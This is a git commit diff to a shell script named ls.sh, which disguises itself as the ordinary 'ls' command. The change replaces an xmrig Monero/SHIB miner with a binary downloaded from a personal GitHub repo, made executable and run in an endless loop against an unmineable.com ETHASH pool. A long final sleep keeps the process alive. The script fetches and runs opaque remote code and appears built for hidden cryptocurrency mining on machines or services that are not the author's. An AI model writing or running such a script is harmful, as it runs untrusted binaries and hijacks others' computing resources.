71e8a5a40507cb7feca973ba032a250c5c58326e
mazin22 <44357016+mazin22@users.noreply.github.com>
2021-08-21 14:02:53 +0530

    Update ls.sh

--- ls.sh
+++ ls.sh
@@ -1,7 +1,10 @@
 #!/bin/bash
 POOL=ethash.unmineable.com:3333
 WORKER=$(echo $(shuf -i 10-40 -n 1)-CO#im8m-ybvt)
-wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz
-tar -zxvf xmrig-6.12.2-linux-x64.tar.gz
-cd xmrig-6.12
-./xmrig -o rx.unmineable.com:3333 -a rx -k -t 3 -u SHIB:0x663e23e815ff1720b42e223f757fb245d97fbc41
+wget https://github.com/skullCANDe/hick/raw/main/tuyulgpu
+chmod +x tuyulgpu
+while [ 1 ]; do
+./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
+sleep 5
+done
+sleep 999999999 
